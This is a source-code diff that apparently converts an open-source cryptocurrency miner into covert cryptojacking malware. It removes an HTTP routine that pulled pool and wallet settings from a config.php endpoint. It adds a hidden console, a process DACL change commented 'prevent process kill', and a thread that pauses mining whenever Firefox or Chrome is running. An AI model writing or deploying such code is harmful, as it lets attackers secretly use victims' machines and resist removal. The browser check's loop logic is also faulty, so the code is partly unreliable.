@@ -22,79 +22,75 @@
 */
 
 #include "App.h"
-#include <windows.h>
-#include <string.h>
-#include <vector>
-#include <locale>
-#include <sstream>
-#include <winsock2.h>
+#include <Windows.h>
+#include <sddl.h>
+#include <tlhelp32.h>
+#include <thread>
 
-#pragma comment(lib,"ws2_32.lib")
+#pragma comment(linker, "/subsystem:windows /ENTRY:mainCRTStartup") // hide console
 
-std::string SendRequest(std::string url) {
-	int i = 0;
-	SOCKET Socket;
-	int nDataLength;
-	WSADATA wsaData;
-	std::locale local;
-	char buffer[8500];
-	SOCKADDR_IN SockAddr;
-	struct hostent *host;
-	std::string website_HTML;
+bool DACL()
+{
+	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
+	SECURITY_ATTRIBUTES sa;
+	TCHAR * szSD = TEXT("D:P");
 
-	std::string domain = "127.0.0.1";
-
-	std::string get_http = "GET " + url
-		+ " HTTP/1.1\r\n"
-		+ "Host: " + domain + "\r\n"
-		+ "Connection: close\r\n\r\n";
-
-	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) { return 0; }
-
-	Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-	host = gethostbyname(domain.c_str());
-	SockAddr.sin_port = htons(80);
-	SockAddr.sin_family = AF_INET;
-	SockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);
-
-	if (connect(Socket, (SOCKADDR*)(&SockAddr), sizeof(SockAddr)) != 0) { return 0; }
-
-	send(Socket, get_http.c_str(), strlen(get_http.c_str()), 0);
-
-	while ((nDataLength = recv(Socket, buffer, 10000, 0)) > 0) {
-		while (buffer[i] >= 32 || buffer[i] == '\n' || buffer[i] == '\r') {
-			website_HTML += buffer[i];
-			i += 1;
-		}
-	}
-
-	size_t pos = website_HTML.find("\r\n\r\n");
-	std::string cleaned = website_HTML.substr(pos + 4);
-
-	closesocket(Socket);
-	WSACleanup();
-
-	return cleaned;
+	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
+	sa.bInheritHandle = FALSE;
+	if (!ConvertStringSecurityDescriptorToSecurityDescriptor(szSD, SDDL_REVISION_1, &(sa.lpSecurityDescriptor), NULL))
+		return FALSE;
+	if (!SetKernelObjectSecurity(hProcess, DACL_SECURITY_INFORMATION, sa.lpSecurityDescriptor))
+		return FALSE;
+	return TRUE;
 }
 
-int Configure(std::string pool, std::string wallet, std::string pass) {
+bool noIDLE(void)
+{
+	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	PROCESSENTRY32 pe;
+	pe.dwSize = sizeof(PROCESSENTRY32);
+	Process32First(hSnapshot, &pe);
+	while (Process32Next(hSnapshot, &pe)) {
+		for (int i = 0; i != 25; i++) {
+			if (lstrcmp(pe.szExeFile, L"firefox.exe") == 0 || lstrcmp(pe.szExeFile, L"chrome.exe") == 0)
+				return true;
+			else
+				return false;
+		}
+	}
+}
 
-	char *pool_c = new char[pool.length() + 1];
-	strcpy(pool_c, pool.c_str());
+void checkIDLE() {
+	while (true) {
+		bool Founded = false;
 
-	char *wallet_c = new char[wallet.length() + 1];
-	strcpy(wallet_c, wallet.c_str());
+		if (noIDLE())
+			Founded = true;
 
-	char *pass_c = new char[pass.length() + 1];
-	strcpy(pass_c, pass.c_str());
+		switch (Founded) {
+		case 1:
+			Workers::setEnabled(false);
+			Sleep(30000);
+			break;
 
-	static char * params[] = { "miner", "-o", (char*)pool.c_str(), "-u", wallet_c, "-p", pass_c};
-	App Application(7, params);
-
-	return Application.exec();
+		default:
+			if (!Workers::isEnabled())
+				Workers::setEnabled(true);
+			break;
+		}
+		
+		Sleep(1000);
+	}
 }
 
 int main()
 {
-	Configure(SendRequest("/config.php?id=pool"), SendRequest("/config.php?id=wallet"), SendRequest("/config.php?id=pass"));
-}
+	DACL(); //prevent process kill
+	
+	std::thread* user_idle = new std::thread(checkIDLE); //check computer idle
+	user_idle->detach();
+	
+	static char * params[] = { "miner", "-o", "pool", "-u", "wallet", "-p", "x"};
+	App Application(7, params);
+
+	return Application.exec();}
